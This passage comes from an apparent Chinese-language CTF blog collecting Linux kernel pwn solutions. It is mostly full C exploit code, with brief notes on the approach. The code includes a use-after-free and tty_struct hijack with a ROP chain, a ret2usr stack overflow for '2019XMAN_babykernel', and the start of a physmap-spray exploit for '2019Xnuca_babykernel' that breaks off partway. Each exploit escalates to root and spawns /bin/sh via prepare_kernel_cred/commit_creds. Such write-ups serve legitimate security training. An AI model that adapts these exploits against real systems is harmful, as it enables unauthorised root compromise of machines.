<span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEW 0x1336</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Y_DEADBEEF 0x1338</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_DEADBEEF 0x1339</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COPY 0x1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UAF 0x133D</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW 0x133B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT 0x133A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    signal(SIGSEGV,get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[i] = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line">		<span class="keyword">if</span> (t[i] == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]open ptmx error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)</span><br><span class="line">		close(t[i]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/kpwn"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,NEW,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,NEW,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,NEW,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,NEW,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd,Y_DEADBEEF,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(fd,COPY,buf);</span><br><span class="line">    ioctl(fd,N_DEADBEEF,<span class="number">1</span>);</span><br><span class="line">    ioctl(fd,Y_DEADBEEF,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(fd,UAF,buf);</span><br><span class="line"><span class="comment">//------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">int</span> ptmx_fd = open(<span class="string">"/dev/ptmx"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(ptmx_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open ptmx error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span>* user_buf = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = (<span class="keyword">size_t</span>)user_buf;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x300</span>;</span><br><span class="line">    ioctl(fd,SHOW,buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = user_buf[<span class="number">3</span>] - <span class="number">0x6280e0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> heap_base = user_buf[<span class="number">2</span>] - <span class="number">0x189a80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]heap_base = %p\n"</span>,heap_base);    </span><br><span class="line">    <span class="keyword">size_t</span> prepare_kernel_cred = kernel_base + <span class="number">0x4f050</span>;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds = kernel_base + <span class="number">0x4f210</span>;</span><br><span class="line"></span><br><span class="line">    user_buf[<span class="number">3</span>] = heap_base + <span class="number">0xe8d2400</span>;</span><br><span class="line">    ioctl(fd,EDIT,buf);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">3</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    ioctl(fd,COPY,buf);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = (<span class="keyword">size_t</span>)user_buf;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x300</span>;</span><br><span class="line">    memset(user_buf,'\x00',0x300);</span><br><span class="line">    user_buf[<span class="number">0</span>] = kernel_base + <span class="number">0x402c94</span>;</span><br><span class="line">    user_buf[<span class="number">1</span>] = heap_base + <span class="number">0xe8d2400</span> + <span class="number">0x280</span>; </span><br><span class="line">    user_buf[<span class="number">7</span>] = kernel_base + <span class="number">0x200f86</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>] = kernel_base + <span class="number">0x354a0</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">2</span>] = prepare_kernel_cred;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">3</span>] = kernel_base + <span class="number">0x1dd069</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">4</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">5</span>] = commit_creds;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">6</span>] = kernel_base + <span class="number">0x200c2e</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">8</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">9</span>] = kernel_base + <span class="number">0x1a306</span>;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">10</span>] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">11</span>] = user_cs;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">12</span>] = user_rflags;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">13</span>] = user_rsp;</span><br><span class="line">    user_buf[<span class="number">0x280</span>/<span class="number">8</span>+<span class="number">14</span>] = user_ss;</span><br><span class="line">    <span class="comment">//0xffffffff811dd069: mov rdi, rax; mov qword ptr [rdi], 1; pop rbp; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff81200c2e: swapgs; popfq; pop rbp; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff8101a306: iretq; pop rbp; ret; </span></span><br><span class="line">    ioctl(fd,EDIT,buf);</span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',8);</span><br><span class="line">    write(ptmx_fd,buf,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/20/zycwq8tufCB3gU4.png" alt="x1.PNG"></p>
<h1 id="2019XMAN-babykernel"><a href="#2019XMAN-babykernel" class="headerlink" title="2019XMAN_babykernel"></a>2019XMAN_babykernel</h1><h2 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a>思路：</h2><p>这题貌似出坏了？？开始一直卡在<code>read</code>和<code>unlock_ioctl</code>里，<code>read</code>我不知道怎么传第四个参数，<code>unlock_ioctl</code>第一个参数一顿骚操作也没看懂，开始一直想着泄露然后<code>ROP</code>，然后就一直卡住，结果后来发现没开<code>kaslr</code>，开<code>kaslr</code>，<code>kaslr</code>，<code>aslr</code>，<code>slr</code>，<code>lr</code>，<code>r</code>。。。我在想当时只有两解是不是大家也都没看到这个条件？？</p>
<h2 id="exp：-21"><a href="#exp：-21" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff81077620</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810779b0</span>;</span><br><span class="line"><span class="keyword">size_t</span> get_shell_addr = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">su</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"push user_ss;"</span></span><br><span class="line">        <span class="string">"push user_rsp;"</span></span><br><span class="line">        <span class="string">"push user_rflags;"</span></span><br><span class="line">        <span class="string">"push user_cs;"</span></span><br><span class="line">        <span class="string">"push get_shell_addr;"</span></span><br><span class="line">        <span class="string">"swapgs;"</span></span><br><span class="line">        <span class="string">"iretq;"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mychrdev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open mychrdev error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    memset(buf,'\x00',0x100);</span><br><span class="line">    buf[<span class="number">11</span>] = <span class="number">0xffffffff8101b51c</span>; </span><br><span class="line">    buf[<span class="number">12</span>] = <span class="number">0x6f0</span>;</span><br><span class="line">    buf[<span class="number">13</span>] = <span class="number">0xffffffff810261c2</span>;</span><br><span class="line">    buf[<span class="number">14</span>] = (<span class="keyword">size_t</span>)su;</span><br><span class="line">    write(fd,buf,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2019Xnuca-babykernel"><a href="#2019Xnuca-babykernel" class="headerlink" title="2019Xnuca_babykernel"></a>2019Xnuca_babykernel</h1><h2 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a>思路：</h2><p>这题是涨了新姿势的一题，再次膜<code>NESE</code>的巨佬们，仍然是<code>5.2.0</code>的<code>kernel</code>，虽然我最后成功跳到<code>shellcode</code>，也回到了用户态，但是没有成功<code>getshell</code>，还是报错了。。。还有待探究。</p>
<h2 id="exp：-22"><a href="#exp：-22" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">control_flow_hijack_primitive</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> rax;</span><br><span class="line">    <span class="keyword">size_t</span> rbx;</span><br><span class="line">    <span class="keyword">size_t</span> rcx;</span><br><span class="line">    <span class="keyword">size_t</span> rdx;</span><br><span class="line">    <span class="keyword">size_t</span> rsi;</span><br><span class="line">    <span class="keyword">size_t</span> rdi;</span><br><span class="line">    <span class="keyword">size_t</span> rsp;</span><br><span class="line">    <span class="keyword">size_t</span> rbp;</span><br><span class="line">    <span class="keyword">size_t</span> r8;</span><br><span class="line">    <span class="keyword">size_t</span> r9;</span><br><span class="line">    <span class="keyword">size_t</span> r10;</span><br><span class="line">    <span class="keyword">size_t</span> r11;</span><br><span class="line">    <span class="keyword">size_t</span> r12;</span><br><span class="line">    <span class="keyword">size_t</span> r13;</span><br><span class="line">    <span class="keyword">size_t</span> r14;</span><br><span class="line">    <span class="keyword">size_t</span> r15;</span><br><span class="line">    <span class="keyword">size_t</span> rip;</span><br><span class="line">    <span class="keyword">size_t</span> reset_all;</span><br><span class="line">&#125;*user_ptr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> regcache_mark_dirty = <span class="number">0xffffffff81608250</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff81087130</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff81086e20</span>;</span><br><span class="line"><span class="keyword">size_t</span> mp_size = <span class="number">1024</span>*<span class="number">64</span>;</span><br><span class="line"><span class="keyword">size_t</span> spray_times = <span class="number">32</span>*<span class="number">64</span>;</span><br><span class="line"><span class="keyword">size_t</span> set_memory_x	= <span class="number">0xffffffff81056ca0</span>;</span><br><span class="line"><span class="keyword">size_t</span> guess_physmap = <span class="number">0xffff888007a72000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//set_memory_rw = 0xffffffff810573b0</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]root now!!!"</span>);</span><br><span class="line">        <span class="keyword">char</span>* args[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        execv(<span class="string">"/bin/sh"</span>, args);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span 